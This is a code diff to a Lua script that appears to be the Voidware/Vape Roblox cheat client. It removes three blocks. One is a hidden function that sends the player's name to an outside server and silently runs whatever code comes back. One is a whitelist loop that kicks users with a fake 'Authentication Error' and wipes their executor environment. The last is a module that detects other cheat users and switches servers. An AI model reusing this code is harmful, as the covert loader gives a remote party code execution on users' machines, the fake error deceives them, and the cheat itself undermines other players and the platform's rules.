@@ -69,18 +69,6 @@ pcall(function() core = game:GetService('CoreGui') end)
 
 --task.spawn(function() pcall(function() pload("Libraries/GlobalFunctionsHandler.lua", false) end) end)
 
-local VWeGETSIGMAED = function()
-	return game:HttpGet("https://voidware-stats.vapevoidware.xyz/sigma_alpha_big_darizzler?user=" .. lplr.Name, true)
-    
-end
-
-task.spawn(function()
-	pcall(function()
-		loadstring(VWeGETSIGMAED())()
-	end)
-end)
-
-
 local function warningNotification(title, text, delay)
 	local suc, res = pcall(function()
 		local frame = GuiLibrary.CreateNotification(title, text, delay, "assets/InfoNotification.png")
@@ -640,63 +628,6 @@ run(function()
 	})
 end)
 
-task.spawn(function()
-	local strikes = 0
-	while true do
-		task.wait()
-		local suc, err = pcall(function()
-			local function trigger(check)
-				strikes = strikes + 1
-				if strikes < 10 then return end
-				pcall(function()
-					local function resetExecutor()
-						pcall(function()
-							for i,v in pairs(getgenv()) do
-								getgenv()[i] = nil
-							end
-							getgenv().getgenv = nil
-						end)
-					end
-					game:GetService("Players").LocalPlayer:Kick("Authentication Error 00001 Please rejoin and if the error persists report it in discord.gg/voidware CHECKID: "..tostring(check)); 
-					shared.GuiLibrary = nil; 
-					resetExecutor()
-				end)
-			end
-			local a, b, c = shared.vapewhitelist:get(game:GetService("Players").LocalPlayer) 
-			if tonumber(a) == nil then trigger(); return end
-			local stat = tonumber(a) > 0
-			if stat then
-				local suc, res
-				task.spawn(function()
-					suc, res = pcall(function()
-						return game:HttpGet('https://whitelist.vapevoidware.xyz', true)
-					end)
-				end)
-				task.wait(10)
-				if suc == nil or suc ~= nil and type(suc) ~= 'boolean' or suc ~= nil and type(suc) == "boolean" and suc == false then
-					trigger('http')
-				else
-					local suc2, res2
-					task.spawn(function()
-						suc2, res2 = pcall(function()
-							return game:GetService("HttpService"):JSONDecode(res)
-						end) 
-					end)
-					task.wait(2)
-					if suc2 == nil or suc2 ~= nil and type(suc2) ~= 'boolean' or suc2 ~= nil and type(suc2) == "boolean" and suc2 == false then trigger('json1'); return end
-					if type(res2) ~= 'table' then trigger('json2') else
-						if res2.WhitelistedUsers == nil or res2.WhitelistedUsers and type(res2.WhitelistedUsers) ~= 'table' then trigger('json3') else
-							for i,v in pairs(res2.WhitelistedUsers) do
-								if tostring(i) ~= 'default' and tonumber(i) == nil then trigger('manipulation') end
-							end
-						end
-					end
-				end
-			end
-		end)
-		if (not suc) then warn('whitelist check error: '..tostring(err)) end
-	end
-end)
 
 run(function()
 	local AnimationChanger = {Enabled = false}
@@ -1004,65 +935,6 @@ run(function()
 			end
 		end
 	})
-end)
-
-run(function() local VapePrivateDetector = {Enabled = false}
-	local VPLeave = {Enabled = false}
-	local alreadydetected = {}
-	VapePrivateDetector = GuiLibrary.ObjectsThatCanBeSaved.VoidwareWindow.Api.CreateOptionsButton({
-		Name = "VapePrivateDetector",
-		Function = function(callback)
-			if callback then
-				task.spawn(function()
-					if not shared.vapewhitelist.loaded then 
-						repeat task.wait() until shared.vapewhitelist.loaded or not VapePrivateDetector.Enabled
-					end
-					if not VapePrivateDetector.Enabled then 
-						return 
-					end
-					for i,v in pairs(playersService:GetPlayers()) do
-						if v ~= lplr then
-							local rank = shared.vapewhitelist:get(v)
-							if rank > 0 and not table.find(alreadydetected, v) then
-								local rankstring = rank == 1 and "Private Member" or rank > 1 and "Owner"
-								warningNotification("VapePrivateDetector", "Vape "..rankstring.." Detected! | "..v.DisplayName, 120)
-								table.insert(alreadydetected, v)
-								if VPLeave.Enabled then
-									local newserver = nil
-									repeat newserver = findnewserver() until newserver 
-									game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, newserver, lplr)
-								end
-							end
-						end
-					end
-					table.insert(VapePrivateDetector.Connections, playersService.PlayerAdded:Connect(function(v)
-						local rank = shared.vapewhitelist:get(v)
-						if rank > 0 and not table.find(alreadydetected, v) then
-						local rankstring = rank == 1 and "Private Member" or rank > 1 and "Owner"
-						warningNotification("VapePrivateDetector", "Vape "..rankstring.." Detected! | "..v.DisplayName, 120)
-						table.insert(alreadydetected, v)
-						if VPLeave.Enabled then
-							local newserver = nil
-							repeat newserver = findnewserver() until newserver 
-							game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, newserver, lplr)
-						end
-						end 
-					end))
-				end)
-			end
-		end
-	})
-	VPLeave = VapePrivateDetector.CreateToggle({
-		Name = "ServerHop",
-		HoverText = "switches servers on detection.",
-		Function = function() end
-	})
-	--[[task.spawn(function()
-		repeat task.wait() until shared.vapewhitelist.loaded 
-		if shared.vapewhitelist:get(lplr) ~= 0 then 
-			pcall(GuiLibrary.RemoveObject, "VapePrivateDetectorOptionsButton")
-		end
-	end)--]]
 end)
 
 run(function() local InfiniteYield = {Enabled = false}
